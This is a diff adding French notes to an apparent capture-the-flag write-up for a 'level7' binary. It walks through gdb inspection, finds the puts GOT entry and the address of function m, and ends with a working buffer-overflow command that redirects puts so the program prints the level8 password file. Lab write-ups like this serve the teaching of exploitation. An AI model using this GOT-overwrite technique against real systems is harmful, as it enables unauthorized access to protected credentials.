@@ -1,4 +1,33 @@
-m: 0x080484f4
-puts: 0x8049928
+gdb level7
+info function
+    0x080484f4  m
+    0x08048521  main
 
+On inspecte la fonction main puis la fonction m
+
+La fonction m récupère la current_time et fais un printf d'une variable globale (c, récupérer grâce à info variables) ainsi que de la current_time
+La fonction main fopen le fichier "/home/user/level8/.pass", clairement celui qui nous intéresse, et écrit son contenu dans la variable globale c via un fgets.
+puis affiche, via puts: ~~
+
+On va donc utiliser puts pour jump sur la fonction m, qui va afficher ce qu'il y a dans la variable globale c.
+
+Pour cela on a besoin de l'adresse du jump dans puts
+
+disas puts
+    0x08048400 <+0>:     jmp    *0x8049928
+
+0x8049928
+
+puis de l'adresse de la fonction m
+
+info function m
+    0x080484f4  m
+
+0x080484f4
+
+
+puts: 0x8049928
+m: 0x080484f4
+
+On peut donc lancer notre attaque de cette façon.
 ./level7 `python -c 'print "A"*20 + "\x28\x99\x04\x08"'` `python -c 'print "\xf4\x84\x04\x08"'`
